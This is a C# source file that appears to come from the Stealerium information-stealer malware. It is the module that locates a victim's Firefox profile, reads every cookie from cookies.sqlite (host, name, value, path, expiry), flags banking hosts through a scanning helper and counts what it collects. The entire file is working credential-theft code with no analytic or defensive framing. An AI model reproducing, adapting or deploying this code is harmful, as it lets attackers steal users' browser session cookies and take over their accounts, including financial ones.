using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Firefox;

internal sealed class CCookies
{
	private static string GetCookiesDbPath(string path)
	{
		try
		{
			string path2 = path + "\\Profiles";
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\cookies.sqlite"))
					{
						return text + "\\cookies.sqlite";
					}
				}
			}
		}
		catch (Exception ex)
		{
			Logging.Log("Firefox >> Failed to find bookmarks\n" + ex);
		}
		return null;
	}

	public static List<Cookie> Get(string path)
	{
		List<Cookie> list = new List<Cookie>();
		try
		{
			SqLite sqLite = SqlReader.ReadTable(GetCookiesDbPath(path), "moz_cookies");
			if (sqLite == null)
			{
				return list;
			}
			for (int i = 0; i < sqLite.GetRowCount(); i++)
			{
				Cookie cookie = default(Cookie);
				cookie.HostKey = sqLite.GetValue(i, 4);
				cookie.Name = sqLite.GetValue(i, 2);
				cookie.Value = sqLite.GetValue(i, 3);
				cookie.Path = sqLite.GetValue(i, 5);
				cookie.ExpiresUtc = sqLite.GetValue(i, 6);
				Cookie item = cookie;
				Banking.ScanData(item.HostKey);
				Counter.Cookies++;
				list.Add(item);
			}
			return list;
		}
		catch (Exception ex)
		{
			Logging.Log("Firefox >> cookies collection failed\n" + ex);
			return list;
		}
	}
}
